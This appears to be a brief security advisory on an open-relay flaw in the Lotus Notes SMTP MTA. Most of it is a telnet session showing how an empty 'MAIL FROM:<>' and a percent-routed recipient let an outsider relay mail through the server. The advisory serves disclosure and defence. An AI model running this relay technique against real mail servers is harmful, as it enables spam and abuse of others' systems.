source: http://www.securityfocus.com/bid/487/info

Lotus Notes SMTP MTA is susceptible to being used as a mail relay for SPAM or other unsolicited email. Connecting to the mail server (tcp25) and issuing a 'mail from' command with <> as the data may allow an unauthorized user to relay email via this server. 

telnet server 25
Connected to 192.168.1.1.
Escape character is '^]'.
220 company.com Lotus SMTP MTA Service Ready
HELO sample.domain
250 company.com
MAIL FROM:<>
250 OK
RCPT TO:<recipient%remote.domain.net@company.com>
250 OK
DATA
From: ... etc

text of message

.
250 Message received OK.
quit
221 GoodBye 